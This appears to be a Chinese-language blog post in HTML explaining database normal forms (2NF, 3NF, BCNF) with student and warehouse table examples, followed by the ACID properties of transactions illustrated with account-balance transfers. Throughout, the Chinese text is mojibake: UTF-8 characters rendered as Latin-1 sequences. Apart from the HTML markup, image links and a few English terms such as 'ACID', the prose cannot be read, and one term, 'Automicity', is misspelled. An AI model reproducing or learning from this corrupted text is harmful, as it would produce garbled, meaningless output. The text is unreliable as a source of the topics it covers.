<p>æ”¹æˆ</p>
<table>
<thead>
<tr>
<th>å­¦å·</th>
<th>å§“å</th>
<th>å¹´çº§</th>
<th>ç­çº§</th>
</tr>
</thead>
<tbody><tr>
<td>0001</td>
<td>å°çº¢</td>
<td>é«˜ä¸‰</td>
<td>1ç­</td>
</tr>
</tbody></table>
<h3 id="ç¬¬äºŒèŒƒå¼ï¼ˆå±æ€§å®Œå…¨ä¾èµ–äºä¸»é”®ï¼‰"><a href="#ç¬¬äºŒèŒƒå¼ï¼ˆå±æ€§å®Œå…¨ä¾èµ–äºä¸»é”®ï¼‰" class="headerlink" title="ç¬¬äºŒèŒƒå¼ï¼ˆå±æ€§å®Œå…¨ä¾èµ–äºä¸»é”®ï¼‰"></a>ç¬¬äºŒèŒƒå¼ï¼ˆå±æ€§å®Œå…¨ä¾èµ–äºä¸»é”®ï¼‰</h3><p>å®šä¹‰ï¼šæ»¡è¶³ç¬¬ä¸€èŒƒå¼å‰æï¼Œ å½“å­˜åœ¨è”åˆä¸»é”®çš„æ—¶å€™ï¼Œæ‰ä¼šå‘ç”Ÿä¸ç¬¦åˆç¬¬äºŒèŒƒå¼çš„æƒ…å†µã€‚æ¯”å¦‚æœ‰ä¸¤ä¸ªå±æ€§çš„è”åˆä¸»é”®ï¼Œå¦‚æœå­˜åœ¨è¿™æ ·çš„å±æ€§ï¼Œå®ƒåªä¾èµ–äºè”åˆä¸»é”®ä¸­çš„ä¸€ä¸ªå±æ€§è€Œä¸ä¾èµ–å¦ä¸€ä¸ªï¼Œè¿™å°±æ˜¯ä¸ç¬¦åˆç¬¬äºŒèŒƒå¼çš„ã€‚</p>
<p>ä»…ä»…ç¬¦åˆ1NFçš„è®¾è®¡ï¼Œä»ç„¶ä¼šå­˜åœ¨æ•°æ®å†—ä½™è¿‡å¤§ï¼Œæ’å…¥å¼‚å¸¸ï¼Œåˆ é™¤å¼‚å¸¸ï¼Œä¿®æ”¹å¼‚å¸¸çš„é—®é¢˜ï¼Œä¾‹å¦‚ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151849658.jpg" alt="img"></p>
<p>æ³¨ï¼‘ï¼šæ ¹æ®ä¸‰ç§å…³ç³»å®Œæ•´æ€§çº¦æŸä¸­å®ä½“å®Œæ•´æ€§çš„è¦æ±‚ï¼Œå…³ç³»ä¸­çš„ç ï¼ˆæ³¨ï¼’ï¼‰æ‰€åŒ…å«çš„ä»»æ„ä¸€ä¸ªå±æ€§éƒ½ä¸èƒ½ä¸ºç©ºï¼Œæ‰€æœ‰å±æ€§çš„ç»„åˆä¹Ÿä¸èƒ½é‡å¤ã€‚ä¸ºäº†æ»¡è¶³æ­¤è¦æ±‚ï¼Œå›¾ä¸­çš„è¡¨ï¼Œåªèƒ½å°†å­¦å·ä¸è¯¾åçš„ç»„åˆä½œä¸ºç ï¼Œå¦åˆ™å°±æ— æ³•å”¯ä¸€åœ°åŒºåˆ†æ¯ä¸€æ¡è®°å½•ã€‚</p>
<p>æ³¨ï¼’ï¼šç ï¼šå…³ç³»ä¸­çš„æŸä¸ªå±æ€§æˆ–è€…æŸå‡ ä¸ªå±æ€§çš„ç»„åˆï¼Œç”¨äºåŒºåˆ†æ¯ä¸ªå…ƒç»„ï¼ˆå¯ä»¥æŠŠâ€œå…ƒç»„â€ç†è§£ä¸ºä¸€å¼ è¡¨ä¸­çš„æ¯æ¡è®°å½•ï¼Œä¹Ÿå°±æ˜¯æ¯ä¸€è¡Œï¼‰ã€‚</p>
<ol>
<li>æ¯ä¸€åå­¦ç”Ÿçš„å­¦å·ã€å§“åã€ç³»åã€ç³»ä¸»ä»»è¿™äº›æ•°æ®é‡å¤å¤šæ¬¡ã€‚æ¯ä¸ªç³»ä¸å¯¹åº”çš„ç³»ä¸»ä»»çš„æ•°æ®ä¹Ÿé‡å¤å¤šæ¬¡ã€‚â€”â€”<strong>æ•°æ®å†—ä½™è¿‡å¤§</strong>ã€‚</li>
<li>å‡å¦‚å­¦æ ¡æ–°å»ºäº†ä¸€ä¸ªç³»ï¼Œä½†æ˜¯æš‚æ—¶è¿˜æ²¡æœ‰æ‹›æ”¶ä»»ä½•å­¦ç”Ÿï¼ˆæ¯”å¦‚3æœˆä»½å°±æ–°å»ºäº†ï¼Œä½†è¦ç­‰åˆ°8æœˆä»½æ‰æ‹›ç”Ÿï¼‰ï¼Œé‚£ä¹ˆæ˜¯æ— æ³•å°†ç³»åä¸ç³»ä¸»ä»»çš„æ•°æ®å•ç‹¬åœ°æ·»åŠ åˆ°æ•°æ®è¡¨ä¸­å»çš„ ï¼ˆæ³¨ï¼‘ï¼‰ã€‚â€”â€”<strong>æ’å…¥å¼‚å¸¸</strong>ã€‚</li>
<li>å‡å¦‚å°†æŸä¸ªç³»ä¸­æ‰€æœ‰å­¦ç”Ÿç›¸å…³çš„è®°å½•éƒ½åˆ é™¤ï¼Œé‚£ä¹ˆæ‰€æœ‰ç³»ä¸ç³»ä¸»ä»»çš„æ•°æ®ä¹Ÿå°±éšä¹‹æ¶ˆå¤±äº†ï¼ˆä¸€ä¸ªç³»æ‰€æœ‰å­¦ç”Ÿéƒ½æ²¡æœ‰äº†ï¼Œå¹¶ä¸è¡¨ç¤ºè¿™ä¸ªç³»å°±æ²¡æœ‰äº†ï¼‰ã€‚â€”â€”<strong>åˆ é™¤å¼‚å¸¸</strong>ã€‚</li>
<li>å‡å¦‚æå‹‡è½¬ç³»åˆ°æ³•å¾‹ç³»ï¼Œé‚£ä¹ˆä¸ºäº†ä¿è¯æ•°æ®åº“ä¸­æ•°æ®çš„ä¸€è‡´æ€§ï¼Œéœ€è¦ä¿®æ”¹ä¸‰æ¡è®°å½•ä¸­ç³»ä¸ç³»ä¸»ä»»çš„æ•°æ®ã€‚â€”â€”<strong>ä¿®æ”¹å¼‚å¸¸</strong>ã€‚</li>
</ol>
<p>ä¿®æ”¹åï¼š</p>
<p>é€‰è¯¾è¡¨</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151854983.jpg" alt="img"></p>
<p>å­¦ç”Ÿè¡¨</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151854314.jpg" alt="img"></p>
<p>å¯¹äºä¿®æ”¹åçš„è¡¨ï¼š</p>
<ol>
<li>æå°æ˜è½¬ç³»åˆ°æ³•å¾‹ç³»<br>åªéœ€è¦ä¿®æ”¹ä¸€æ¬¡æå°æ˜å¯¹åº”çš„ç³»çš„å€¼å³å¯ã€‚â€”â€”æœ‰æ”¹è¿›</li>
<li>æ•°æ®å†—ä½™æ˜¯å¦å‡å°‘äº†ï¼Ÿ<br>å­¦ç”Ÿçš„å§“åã€ç³»åä¸ç³»ä¸»ä»»ï¼Œä¸å†åƒä¹‹å‰ä¸€æ ·é‡å¤é‚£ä¹ˆå¤šæ¬¡äº†ã€‚â€”â€”æœ‰æ”¹è¿›</li>
<li>åˆ é™¤æŸä¸ªç³»ä¸­æ‰€æœ‰çš„å­¦ç”Ÿè®°å½•<br>è¯¥ç³»çš„ä¿¡æ¯ä»ç„¶å…¨éƒ¨ä¸¢å¤±ã€‚â€”â€”æ— æ”¹è¿›</li>
<li>æ’å…¥ä¸€ä¸ªå°šæ— å­¦ç”Ÿçš„æ–°ç³»çš„ä¿¡æ¯ã€‚<br>å› ä¸ºå­¦ç”Ÿè¡¨çš„ç æ˜¯å­¦å·ï¼Œä¸èƒ½ä¸ºç©ºï¼Œæ‰€ä»¥æ­¤æ“ä½œä¸è¢«å…è®¸ã€‚â€”â€”æ— æ”¹è¿›</li>
</ol>
<p>æ‰€ä»¥è¯´ï¼Œä»…ä»…ç¬¦åˆ2NFçš„è¦æ±‚ï¼Œå¾ˆå¤šæƒ…å†µä¸‹è¿˜æ˜¯ä¸å¤Ÿçš„ï¼Œè€Œå‡ºç°é—®é¢˜çš„åŸå› ï¼Œåœ¨äºä»ç„¶å­˜åœ¨éä¸»å±æ€§<strong>ç³»ä¸»ä»»</strong>å¯¹äºç <strong>å­¦å·</strong>çš„ä¼ é€’å‡½æ•°ä¾èµ–ã€‚ä¸ºäº†èƒ½è¿›ä¸€æ­¥è§£å†³è¿™äº›é—®é¢˜ï¼Œè¿˜éœ€è¦å°†ç¬¦åˆ2NFè¦æ±‚çš„æ•°æ®è¡¨æ”¹è¿›ä¸ºç¬¦åˆ3NFçš„è¦æ±‚ã€‚</p>
<h3 id="ç¬¬ä¸‰èŒƒå¼ï¼ˆå±æ€§ä¸èƒ½ä¼ é€’ä¾èµ–äºä¸»é”®ï¼‰"><a href="#ç¬¬ä¸‰èŒƒå¼ï¼ˆå±æ€§ä¸èƒ½ä¼ é€’ä¾èµ–äºä¸»é”®ï¼‰" class="headerlink" title="ç¬¬ä¸‰èŒƒå¼ï¼ˆå±æ€§ä¸èƒ½ä¼ é€’ä¾èµ–äºä¸»é”®ï¼‰"></a>ç¬¬ä¸‰èŒƒå¼ï¼ˆå±æ€§ä¸èƒ½ä¼ é€’ä¾èµ–äºä¸»é”®ï¼‰</h3><p>å®šä¹‰ï¼šæ»¡è¶³ç¬¬äºŒèŒƒå¼å‰æï¼Œ å¦‚æœæŸä¸€å±æ€§ä¾èµ–äºå…¶ä»–éä¸»é”®å±æ€§ï¼Œè€Œå…¶ä»–éä¸»é”®å±æ€§åˆä¾èµ–äºä¸»é”®ï¼Œé‚£ä¹ˆè¿™ä¸ªå±æ€§å°±æ˜¯é—´æ¥ä¾èµ–äºä¸»é”®ï¼Œè¿™è¢«ç§°ä½œä¼ é€’ä¾èµ–äºä¸»å±æ€§ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<p>é€‰è¯¾è¡¨</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151901434.jpg" alt="img"></p>
<p>å­¦ç”Ÿè¡¨</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151901270.jpg" alt="img"></p>
<p>ç³»è¡¨</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151901808.jpg" alt="img"></p>
<p>ä¿®æ”¹åï¼š</p>
<ol>
<li>åˆ é™¤æŸä¸ªç³»ä¸­æ‰€æœ‰çš„å­¦ç”Ÿè®°å½•<br>è¯¥ç³»çš„ä¿¡æ¯ä¸ä¼šä¸¢å¤±ã€‚â€”â€”æœ‰æ”¹è¿›</li>
<li>æ’å…¥ä¸€ä¸ªå°šæ— å­¦ç”Ÿçš„æ–°ç³»çš„ä¿¡æ¯ã€‚<br>å› ä¸ºç³»è¡¨ä¸å­¦ç”Ÿè¡¨ç›®å‰æ˜¯ç‹¬ç«‹çš„ä¸¤å¼ è¡¨ï¼Œæ‰€ä»¥ä¸å½±å“ã€‚â€”â€”æœ‰æ”¹è¿›</li>
<li>æ•°æ®å†—ä½™æ›´åŠ å°‘äº†ã€‚â€”â€”æœ‰æ”¹è¿›</li>
</ol>
<h3 id="BCNFèŒƒå¼"><a href="#BCNFèŒƒå¼" class="headerlink" title="BCNFèŒƒå¼"></a>BCNFèŒƒå¼</h3><p>è¦äº†è§£ BCNF èŒƒå¼ï¼Œé‚£ä¹ˆå…ˆçœ‹è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼š<br>è‹¥ï¼š</p>
<ol>
<li>æŸå…¬å¸æœ‰è‹¥å¹²ä¸ªä»“åº“ï¼›</li>
<li>æ¯ä¸ªä»“åº“åªèƒ½æœ‰ä¸€åç®¡ç†å‘˜ï¼Œä¸€åç®¡ç†å‘˜åªèƒ½åœ¨ä¸€ä¸ªä»“åº“ä¸­å·¥ä½œï¼›</li>
<li>ä¸€ä¸ªä»“åº“ä¸­å¯ä»¥å­˜æ”¾å¤šç§ç‰©å“ï¼Œä¸€ç§ç‰©å“ä¹Ÿå¯ä»¥å­˜æ”¾åœ¨ä¸åŒçš„ä»“åº“ä¸­ã€‚æ¯ç§ç‰©å“åœ¨æ¯ä¸ªä»“åº“ä¸­éƒ½æœ‰å¯¹åº”çš„æ•°é‡ã€‚</li>
</ol>
<p>é‚£ä¹ˆå…³ç³»æ¨¡å¼ä»“åº“ï¼ˆä»“åº“åï¼Œç®¡ç†å‘˜ï¼Œç‰©å“åï¼Œæ•°é‡ï¼‰ å±äºå“ªä¸€çº§èŒƒå¼ï¼Ÿ</p>
<p>ç­”ï¼šå·²çŸ¥å‡½æ•°ä¾èµ–é›†ï¼šä»“åº“å â†’ ç®¡ç†å‘˜ï¼Œç®¡ç†å‘˜ â†’ ä»“åº“åï¼Œï¼ˆä»“åº“åï¼Œç‰©å“åï¼‰â†’ æ•°é‡<br>ç ï¼šï¼ˆç®¡ç†å‘˜ï¼Œç‰©å“åï¼‰ï¼Œï¼ˆä»“åº“åï¼Œç‰©å“åï¼‰<br>ä¸»å±æ€§ï¼šä»“åº“åã€ç®¡ç†å‘˜ã€ç‰©å“å<br>éä¸»å±æ€§ï¼šæ•°é‡<br>âˆµ ä¸å­˜åœ¨éä¸»å±æ€§å¯¹ç çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–å’Œä¼ é€’å‡½æ•°ä¾èµ–ã€‚âˆ´ æ­¤å…³ç³»æ¨¡å¼å±äº3NFã€‚</p>
<p>åŸºäºæ­¤å…³ç³»æ¨¡å¼çš„å…³ç³»ï¼ˆå…·ä½“çš„æ•°æ®ï¼‰å¯èƒ½å¦‚å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151906491.jpg" alt="img"></p>
<p>å¥½ï¼Œæ—¢ç„¶æ­¤å…³ç³»æ¨¡å¼å·²ç»å±äºäº† 3NFï¼Œé‚£ä¹ˆè¿™ä¸ªå…³ç³»æ¨¡å¼æ˜¯å¦å­˜åœ¨é—®é¢˜å‘¢ï¼Ÿæˆ‘ä»¬æ¥çœ‹ä»¥ä¸‹å‡ ç§æ“ä½œï¼š</p>
<ol>
<li>å…ˆæ–°å¢åŠ ä¸€ä¸ªä»“åº“ï¼Œä½†å°šæœªå­˜æ”¾ä»»ä½•ç‰©å“ï¼Œæ˜¯å¦å¯ä»¥ä¸ºè¯¥ä»“åº“æŒ‡æ´¾ç®¡ç†å‘˜ï¼Ÿâ€”â€”ä¸å¯ä»¥ï¼Œå› ä¸ºç‰©å“åä¹Ÿæ˜¯ä¸»å±æ€§ï¼Œæ ¹æ®å®ä½“å®Œæ•´æ€§çš„è¦æ±‚ï¼Œä¸»å±æ€§ä¸èƒ½ä¸ºç©ºã€‚</li>
<li>æŸä»“åº“è¢«æ¸…ç©ºåï¼Œéœ€è¦åˆ é™¤æ‰€æœ‰ä¸è¿™ä¸ªä»“åº“ç›¸å…³çš„ç‰©å“å­˜æ”¾è®°å½•ï¼Œä¼šå¸¦æ¥ä»€ä¹ˆé—®é¢˜ï¼Ÿâ€”â€”ä»“åº“æœ¬èº«ä¸ç®¡ç†å‘˜çš„ä¿¡æ¯ä¹Ÿè¢«éšä¹‹åˆ é™¤äº†ã€‚</li>
<li>å¦‚æœæŸä»“åº“æ›´æ¢äº†ç®¡ç†å‘˜ï¼Œä¼šå¸¦æ¥ä»€ä¹ˆé—®é¢˜ï¼Ÿâ€”â€”è¿™ä¸ªä»“åº“æœ‰å‡ æ¡ç‰©å“å­˜æ”¾è®°å½•ï¼Œå°±è¦ä¿®æ”¹å¤šå°‘æ¬¡ç®¡ç†å‘˜ä¿¡æ¯ã€‚</li>
</ol>
<p>ä»è¿™é‡Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºç»“è®ºï¼Œåœ¨æŸäº›ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œå³ä½¿å…³ç³»æ¨¡å¼ç¬¦åˆ 3NF çš„è¦æ±‚ï¼Œä»ç„¶å­˜åœ¨ç€æ’å…¥å¼‚å¸¸ï¼Œä¿®æ”¹å¼‚å¸¸ä¸åˆ é™¤å¼‚å¸¸çš„é—®é¢˜ï¼Œä»ç„¶ä¸æ˜¯ â€å¥½â€œ çš„è®¾è®¡ã€‚</p>
<p>é€ æˆæ­¤é—®é¢˜çš„åŸå› ï¼šå­˜åœ¨ç€<strong>ä¸»å±æ€§</strong>å¯¹äºç çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–ä¸ä¼ é€’å‡½æ•°ä¾èµ–ã€‚ï¼ˆåœ¨æ­¤ä¾‹ä¸­å°±æ˜¯å­˜åœ¨ä¸»å±æ€§ã€ä»“åº“åã€‘å¯¹äºç ã€ï¼ˆç®¡ç†å‘˜ï¼Œç‰©å“åï¼‰ã€‘çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–ã€‚</p>
<p>è§£å†³åŠæ³•å°±æ˜¯è¦åœ¨ 3NF çš„åŸºç¡€ä¸Šæ¶ˆé™¤<strong>ä¸»å±æ€§</strong>å¯¹äºç çš„éƒ¨åˆ†ä¸ä¼ é€’å‡½æ•°ä¾èµ–ã€‚</p>
<p>ä»“åº“ï¼ˆä»“åº“åï¼Œç®¡ç†å‘˜ï¼‰<br>åº“å­˜ï¼ˆä»“åº“åï¼Œç‰©å“åï¼Œæ•°é‡ï¼‰</p>
<p>è¿™æ ·ï¼Œä¹‹å‰çš„æ’å…¥å¼‚å¸¸ï¼Œä¿®æ”¹å¼‚å¸¸ä¸åˆ é™¤å¼‚å¸¸çš„é—®é¢˜å°±è¢«è§£å†³äº†ã€‚</p>
<h2 id="äº‹åŠ¡å››å¤§ç‰¹æ€§ï¼ˆACIDï¼‰"><a href="#äº‹åŠ¡å››å¤§ç‰¹æ€§ï¼ˆACIDï¼‰" class="headerlink" title="äº‹åŠ¡å››å¤§ç‰¹æ€§ï¼ˆACIDï¼‰"></a>äº‹åŠ¡å››å¤§ç‰¹æ€§ï¼ˆACIDï¼‰</h2><h3 id="äº‹åŠ¡çš„ç†è§£"><a href="#äº‹åŠ¡çš„ç†è§£" class="headerlink" title="äº‹åŠ¡çš„ç†è§£"></a>äº‹åŠ¡çš„ç†è§£</h3><p>äº‹åŠ¡çš„äº§ç”Ÿï¼Œæ˜¯ä¸ºäº†å½“åº”ç”¨ç¨‹åºè®¿é—®æ•°æ®åº“çš„æ—¶å€™ï¼Œäº‹åŠ¡èƒ½å¤Ÿç®€åŒ–æˆ‘ä»¬çš„ç¼–ç¨‹æ¨¡å‹ï¼Œä¸éœ€è¦æˆ‘ä»¬å»è€ƒè™‘å„ç§å„æ ·çš„æ½œåœ¨é”™è¯¯å’Œå¹¶å‘é—®é¢˜ã€‚å½“æˆ‘ä»¬ä½¿ç”¨äº‹åŠ¡æ—¶ï¼Œè¦ä¹ˆæäº¤ï¼Œè¦ä¹ˆå›æ»šï¼Œä¸ç”¨è€ƒè™‘ç½‘ç»œå¼‚å¸¸ï¼ŒæœåŠ¡å™¨å®•æœºäº†ï¼ŒåŒæ—¶æ›´æ”¹ä¸€ä¸ªæ•°æ®è¿™äº›æƒ…å†µã€‚<strong>å› æ­¤äº‹åŠ¡æœ¬è´¨ä¸Šæ˜¯ä¸ºäº†åº”ç”¨å±‚æœåŠ¡çš„</strong>ï¼Œè€Œä¸æ˜¯ä¼´éšç€æ•°æ®åº“ç³»ç»Ÿå¤©ç”Ÿå°±æœ‰çš„ã€‚</p>
<h4 id="æ•°æ®åº“ä¸ºä»€ä¹ˆè¦æœ‰äº‹åŠ¡ï¼Ÿ"><a href="#æ•°æ®åº“ä¸ºä»€ä¹ˆè¦æœ‰äº‹åŠ¡ï¼Ÿ" class="headerlink" title="æ•°æ®åº“ä¸ºä»€ä¹ˆè¦æœ‰äº‹åŠ¡ï¼Ÿ"></a>æ•°æ®åº“ä¸ºä»€ä¹ˆè¦æœ‰äº‹åŠ¡ï¼Ÿ</h4><p>ä¸ºäº†ä¿è¯æ•°æ®çš„æœ€ç»ˆä¸€è‡´æ€§ã€‚</p>
<h3 id="ACID"><a href="#ACID" class="headerlink" title="ACID"></a>ACID</h3><ul>
<li>åŸå­æ€§ï¼ˆAutomicityï¼‰ï¼šæ»¡è¶³åŸå­æ“ä½œå•å…ƒï¼Œå¯¹æ•°æ®çš„æ“ä½œï¼Œè¦ä¹ˆå…¨éƒ¨æ‰§è¡Œï¼Œè¦ä¹ˆå…¨éƒ¨å¤±è´¥ï¼ˆé€šè¿‡undo logæ¥ä¿è¯ï¼‰ã€‚</li>
<li>ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰ï¼š åº”ç”¨ç³»ç»Ÿä»ä¸€ä¸ªæ­£ç¡®çš„çŠ¶æ€åˆ°å¦ä¸€ä¸ªæ­£ç¡®çš„çŠ¶æ€ã€‚è€ŒACIDå°±æ˜¯è¯´äº‹åŠ¡èƒ½å¤Ÿé€šè¿‡AIDæ¥ä¿è¯è¿™ä¸ªCçš„è¿‡ç¨‹ã€‚Cæ˜¯ç›®çš„ï¼ŒAIDéƒ½æ˜¯æ‰‹æ®µã€‚</li>
<li>éš”ç¦»æ€§ï¼ˆIsolationï¼‰ï¼š äº‹åŠ¡ä¹‹é—´æ—¶ç›¸äº’ç‹¬ç«‹çš„ï¼Œä¸­é—´çŠ¶æ€å¯¹å¤–ä¸å¯è§ã€‚ éš”ç¦»çŠ¶æ€æ‰§è¡Œäº‹åŠ¡ï¼Œä½¿å®ƒä»¬å¥½åƒæ˜¯ç³»ç»Ÿåœ¨ç»™å®šæ—¶é—´å†…æ‰§è¡Œçš„å”¯ä¸€æ“ä½œã€‚å¦‚æœæœ‰ä¸¤ä¸ªäº‹åŠ¡ï¼Œè¿è¡Œåœ¨ç›¸åŒçš„æ—¶é—´å†…ï¼Œæ‰§è¡Œç›¸åŒçš„åŠŸèƒ½ï¼Œäº‹åŠ¡çš„éš”ç¦»æ€§å°†ç¡®ä¿æ¯ä¸€äº‹åŠ¡åœ¨ç³»ç»Ÿä¸­è®¤ä¸ºåªæœ‰è¯¥äº‹åŠ¡åœ¨ä½¿ç”¨ç³»ç»Ÿã€‚è¿™ç§å±æ€§æœ‰æ—¶ç§°ä¸ºä¸²è¡ŒåŒ–ï¼Œä¸ºäº†é˜²æ­¢äº‹åŠ¡æ“ä½œé—´çš„æ··æ·†ï¼Œå¿…é¡»ä¸²è¡ŒåŒ–æˆ–åºåˆ—åŒ–è¯·æ±‚ï¼Œä½¿å¾—åœ¨åŒä¸€æ—¶é—´ä»…æœ‰ä¸€ä¸ªè¯·æ±‚ç”¨äºåŒä¸€æ•°æ®ã€‚</li>
<li>æŒä¹…æ€§ï¼ˆDurabilityï¼‰ï¼š æ•°æ®çš„ä¿®æ”¹æ˜¯æ°¸ä¹…çš„ï¼Œå³ä½¿æ•°æ®åº“å‘ç”Ÿæ•…éšœã€‚</li>
</ul>
<h4 id="ä¸€è‡´æ€§çš„ç†è§£"><a href="#ä¸€è‡´æ€§çš„ç†è§£" class="headerlink" title="ä¸€è‡´æ€§çš„ç†è§£"></a>ä¸€è‡´æ€§çš„ç†è§£</h4><p>ACIDé‡Œçš„AIDéƒ½æ˜¯æ•°æ®åº“çš„ç‰¹å¾ï¼Œä¾èµ–æ•°æ®åº“çš„å…·ä½“å®ç°ã€‚è€Œè¿™ä¸ªCï¼Œå®ƒä¾èµ–äºåº”ç”¨å±‚ï¼Œä¹Ÿå°±æ˜¯ä¾èµ–äºå¼€å‘è€…ã€‚è¿™é‡Œçš„ä¸€è‡´æ€§æ˜¯æŒ‡ç³»ç»Ÿä»ä¸€ä¸ªæ­£ç¡®çš„çŠ¶æ€ï¼Œè¿ç§»åˆ°å¦ä¸€ä¸ªæ­£ç¡®çš„çŠ¶æ€ï¼ˆå½“å‰çš„çŠ¶æ€æ»¡è¶³é¢„å®šçš„çº¦æŸï¼‰ã€‚äº‹åŠ¡å…·å¤‡ACIDé‡ŒCçš„ç‰¹æ€§æ˜¯è¯´é€šè¿‡äº‹åŠ¡çš„AIDæ¥ä¿è¯ä¸€è‡´æ€§ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<blockquote>
<p>æˆ‘ä»¬æåˆ°ä¿é•–ä¼šè¯´å¼ºå£®ã€å¥½åŠŸå¤«å’Œè¸å®ã€‚è¿™é‡Œå¼ºå£®ã€å¥½åŠŸå¤«å’Œè¸å®éƒ½æ˜¯ä¿é•–è‡ªå·±çš„ç‰¹å¾ï¼Œè€Œå®‰å…¨æ˜¯å±äºä½ çš„ï¼Œè€Œä½ é€šè¿‡ä¿é•–çš„ç‰¹å¾æ¥ä¿æŠ¤ä½ çš„å®‰å…¨ã€‚</p>
</blockquote>
<p>æˆ‘ä»¬èƒ½å¤Ÿé€šè¿‡AIDä¿è¯æˆ‘ä»¬çš„ä¸€è‡´æ€§ï¼Œä½†äº‹åŠ¡æœ¬èº«æ²¡åŠæ³•ç¡®ä¿ã€‚ç”¨ä¸Šé¢ä¿é•–çš„ä¾‹å­æ¥è¯´ï¼Œä½ æ­£å¸¸è¢«ä¿æŠ¤ä¸€å®šæ˜¯å®‰å…¨çš„ï¼Œä½†æ˜¯ä½ æ•…æ„éª—ä¿é•–ç¦»å¼€ä½ èº«è¾¹ï¼Œç„¶åä½ è‡ªå·±æºœå‡ºå»ç©å°±ä¸å®‰å…¨äº†ã€‚åŒæ ·ï¼Œå¦‚æœä½ åœ¨äº‹åŠ¡é‡Œæ•…æ„å†™å‡ºè¿åçº¦æŸçš„ä»£ç ï¼Œæ¯”å¦‚åœ¨é“¶è¡Œç³»ç»Ÿé‡Œå®šæ—¶æ¯å¤©ç»™è‡ªå·±çš„è´¦æˆ·æ‰“å…¥100wï¼Œè¿™ä¸ªäº‹åŠ¡æ˜¯æ²¡åŠæ³•çš„ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<blockquote>
<p>Aè¦å‘Bæ”¯ä»˜100å…ƒï¼Œè€ŒAçš„è´¦æˆ·ä¸­åªæœ‰90å…ƒï¼Œå¹¶ä¸”ç»™å®šè´¦æˆ·ä½™é¢è¿™ä¸€åˆ—çš„çº¦æŸæ˜¯ä¸èƒ½å°äº0ã€‚é‚£ä¹ˆè¿™æ¡äº‹åŠ¡æ‰§è¡Œä¼šå¤±è´¥ï¼Œå› ä¸º90-100&#x3D;-10ï¼Œå°äºç»™å®šçš„çº¦æŸã€‚</p>
</blockquote>
<p>è¿™ä¸ªä¾‹å­é‡Œï¼Œæ”¯ä»˜ä¹‹å‰æ•°æ®åº“é‡Œçš„æ•°æ®éƒ½æ˜¯ç¬¦åˆçº¦æŸçš„ï¼Œä½†æ˜¯å¦‚æœäº‹åŠ¡æ‰§è¡ŒæˆåŠŸäº†ï¼Œæ•°æ®åº“çš„æ•°æ®å°±ç ´åçº¦æŸäº†ï¼Œå› æ­¤äº‹åŠ¡ä¸èƒ½æˆåŠŸï¼Œäº‹åŠ¡æä¾›äº†ä¸€è‡´æ€§çš„ä¿è¯ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<blockquote>
<p>Aè¦å‘Bæ”¯ä»˜100å…ƒï¼Œè€ŒAçš„è´¦æˆ·ä¸­åªæœ‰90å…ƒï¼Œè´¦æˆ·ä½™é¢åˆ—æ²¡æœ‰ä»»ä½•çº¦æŸã€‚ä½†æ˜¯ä¸šåŠ¡ä¸Šä¸å…è®¸è´¦æˆ·ä½™é¢å°äº0ã€‚å› æ­¤æ”¯ä»˜å®Œæˆåä¸šåŠ¡ä¸Šä¼šæ£€æŸ¥Açš„è´¦æˆ·ä½™é¢ï¼Œå‘ç°ä½™é¢å°äº0äº†ï¼Œäºæ˜¯ä¸šåŠ¡ä¸Šè¿›è¡Œäº†äº‹åŠ¡çš„å›æ»šã€‚</p>
</blockquote>
<p>è¿™ä¸ªä¾‹å­é‡Œï¼Œå¦‚æœäº‹åŠ¡æ‰§è¡ŒæˆåŠŸï¼Œè™½ç„¶æ²¡æœ‰ç ´åæ•°æ®åº“çš„çº¦æŸï¼Œä½†æ˜¯ç ´åäº†åº”ç”¨å±‚çš„çº¦æŸã€‚è€Œäº‹åŠ¡çš„å›æ»šä¿è¯äº†æ•°æ®åº“çš„çº¦æŸï¼Œå› æ­¤ä¹Ÿå¯ä»¥è¯´äº‹åŠ¡æä¾›äº†ä¸€è‡´æ€§ä¿è¯ï¼ˆpsï¼šäº‹å®ä¸Šï¼Œæ˜¯åº”ç”¨å±‚åˆ©ç”¨äº‹åŠ¡å›æ»šä¿è¯äº†çº¦æŸä¸è¢«ç ´åï¼‰ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<blockquote>
<p>Aè¦å‘Bæ”¯ä»˜100å…ƒï¼Œè€ŒAçš„è´¦æˆ·ä¸­åªæœ‰90å…ƒï¼Œè´¦æˆ·ä½™é¢åˆ—æ²¡æœ‰ä»»ä½•çº¦æŸã€‚ç„¶åæ”¯ä»˜æˆåŠŸäº†ã€‚</p>
</blockquote>
<p>è¿™ä¸ªä¾‹å­é‡Œï¼Œç›´è§‚ä¸Šè´¦æˆ·ä½™é¢ä¸ºä»€ä¹ˆèƒ½ä¸ºè´Ÿå‘¢ï¼Ÿä½†è¿™é‡Œäº‹åŠ¡æ‰§è¡Œå‰å’Œæ‰§è¡Œåï¼Œç³»ç»Ÿæ²¡æœ‰ä»»ä½•çš„çº¦æŸè¢«ç ´åã€‚ä¸€ç›´éƒ½æ˜¯ä¿æŒæ­£ç¡®çš„çŠ¶æ€ã€‚</p>
